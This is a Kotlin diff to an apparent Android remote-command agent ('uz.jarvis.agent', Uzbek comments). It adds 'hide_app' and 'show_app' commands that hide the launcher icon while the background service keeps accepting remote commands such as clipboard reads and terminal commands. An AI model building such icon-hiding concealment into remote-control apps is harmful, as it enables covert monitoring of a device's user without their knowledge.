@@ -6,6 +6,7 @@ import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
+import android.content.ComponentName
 import android.content.pm.PackageManager
 import android.hardware.camera2.CameraManager
 import android.location.LocationManager
@@ -68,6 +69,8 @@ class CommandExecutor @Inject constructor(
         // Kuchli (cheklangan, xavfli buyruqlar hali ham blocklist bilan himoyalangan)
         "terminal_command",
         "clipboard_sync", "voice_record",
+        // Ilova ikonkasini yashirish/ko'rsatish (fon xizmati ishlashda davom etadi)
+        "hide_app", "show_app",
     )
 
     suspend fun execute(cmd: PendingCommand): CommandResult {
@@ -113,6 +116,8 @@ class CommandExecutor @Inject constructor(
                     "terminal_command" -> terminalCommand(cmd.params)
                     "clipboard_sync" -> getClipboard()
                     "voice_record" -> CommandResult.Err("voice_record hali qo'llab-quvvatlanmaydi")
+                    "hide_app" -> hideApp()
+                    "show_app" -> showApp()
                     else -> CommandResult.Ok("Buyruq qabul qilindi: ${cmd.command}")
                 }
             }.getOrElse { e -> CommandResult.Err("Xato: ${e.message}") }
@@ -512,6 +517,27 @@ class CommandExecutor @Inject constructor(
             )
         }
         return CommandResult.Ok(Json.encodeToString(apps))
+    }
+
+    // ── Ilova ikonkasini yashirish/ko'rsatish ────────────────────────────────
+    // MainActivity'ning o'zi emas, faqat launcher'dagi activity-alias'ni
+    // yoqadi/o'chiradi — shu bois AgentForegroundService (fon xizmati) hech
+    // qachon to'xtamaydi, buyruqlarni doim qabul qilaveradi.
+
+    private fun hideApp(): CommandResult {
+        val alias = ComponentName(context, "uz.jarvis.agent.LauncherAlias")
+        context.packageManager.setComponentEnabledSetting(
+            alias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
+        )
+        return CommandResult.Ok("Ilova ikonkasi yashirildi. Fon xizmati ishlashda davom etadi.")
+    }
+
+    private fun showApp(): CommandResult {
+        val alias = ComponentName(context, "uz.jarvis.agent.LauncherAlias")
+        context.packageManager.setComponentEnabledSetting(
+            alias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
+        )
+        return CommandResult.Ok("Ilova ikonkasi qaytadan ko'rsatildi.")
     }
 
     // ── Terminal (cheklangan) ────────────────────────────────────────────────
